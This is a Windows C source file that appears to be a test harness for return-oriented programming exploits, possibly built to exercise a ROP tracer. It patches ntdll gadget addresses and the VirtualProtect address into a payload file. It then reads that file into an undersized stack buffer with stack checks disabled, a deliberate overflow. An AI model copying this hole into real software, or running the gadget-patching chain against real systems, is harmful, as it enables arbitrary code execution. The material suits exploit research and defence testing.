#include "utils.h"
#pragma check_stack(off)

#if 0
#define EXPLOIT_FILE_NAME               "rop-xor-middle.txt"

#define FIRST_GADGET_FILE_OFFSET        (-16) * 8
#define FIRST_GADGET_OFFSET             0x2566D // pop rcx; ret; 

#define SECOND_GADGET_FILE_OFFSET       (-14) * 8
#define SECOND_GADGET_OFFSET            0x8F0F1 // pop r8; pop r9; pop r10; pop r11; ret;

#define THIRD_GADGET_FILE_OFFSET        (-9) * 8
#define THIRD_GADGET_OFFSET             0x8F0F6 // pop rdx; pop r11; ret; 
#else
#define EXPLOIT_FILE_NAME               "rop-xor.txt"

#define FIRST_GADGET_FILE_OFFSET        (-16) * 8
#define FIRST_GADGET_OFFSET             0x8F0F1 // pop r8; pop r9; pop r10; pop r11; ret;

#define SECOND_GADGET_FILE_OFFSET       (-11) * 8
#define SECOND_GADGET_OFFSET            0x2566D // pop rcx; ret; 

#define THIRD_GADGET_FILE_OFFSET        (-9) * 8
#define THIRD_GADGET_OFFSET             0x8F0F6 // pop rdx; pop r11; ret; 
#endif


#define VIRTUAL_PROTECT_FILE_OFFSET     (-6)  * 8

VOID
FixFile(PCHAR FilePath, FILE** File, DWORD* Length)
{
    UNREFERENCED_PARAMETER(Length);

    QWORD gadgetAddr = 0;

    QWORD ntdllAddr = (QWORD)GetModuleHandle("ntdll.dll");
    
    HMODULE kernel32Handle = GetModuleHandle("kernel32.dll");
    QWORD vpAddr = (QWORD)GetProcAddress(kernel32Handle, "VirtualProtect");

    if (fopen_s(File, FilePath, "rb+"))
    {
        printf("[ERROR] fopen_s failed %d!\n", GetLastError());
        return;
    }

    gadgetAddr = ntdllAddr + FIRST_GADGET_OFFSET;
    fseek(*File, FIRST_GADGET_FILE_OFFSET, SEEK_END);
    fwrite(&gadgetAddr, sizeof(QWORD), 1, *File);

    gadgetAddr = ntdllAddr + SECOND_GADGET_OFFSET;
    fseek(*File, SECOND_GADGET_FILE_OFFSET, SEEK_END);
    fwrite(&gadgetAddr, sizeof(QWORD), 1, *File);

    gadgetAddr = ntdllAddr + THIRD_GADGET_OFFSET;
    fseek(*File, THIRD_GADGET_FILE_OFFSET, SEEK_END);
    fwrite(&gadgetAddr, sizeof(QWORD), 1, *File);

    fseek(*File, VIRTUAL_PROTECT_FILE_OFFSET, SEEK_END);
    fwrite(&vpAddr, sizeof(QWORD), 1, *File);

    fclose(*File);

    return;
}

VOID
MyOpenFile(PCHAR FilePath, FILE** File, DWORD* Length)
{
    if (fopen_s(File, FilePath, "rb"))
    {
        printf("[ERROR] fopen_s failed!\n");
        return;
    }

    fseek(*File, 0, SEEK_END);
    *Length = ftell(*File);
    rewind(*File);

    return;
}

VOID
ReadFromFile(FILE* File, DWORD Length)
{
    CHAR smallBuffer[8192] = { 0 };

    printf("Reading %d characters from file: %s\n", Length, EXPLOIT_FILE_NAME);
    fread_s(smallBuffer, Length-1, 1, Length-1, File);

    return;
}

INT
main(
    INT Argc,
    PCHAR Argv[]
)
{
    UNREFERENCED_PARAMETER(Argv);
    UNREFERENCED_PARAMETER(Argc);

    printf("PID: %d\n", GetCurrentProcessId());

    system("pause");

    // LoadLibrary("RopTracerDll.dll");

    FILE* file;
    DWORD length;
    PCHAR fpath = EXPLOIT_FILE_NAME;
    FixFile(fpath, &file, &length);

    MyOpenFile(fpath, &file, &length);
    ReadFromFile(file, length);

    fclose(file);
    
    return 0;
}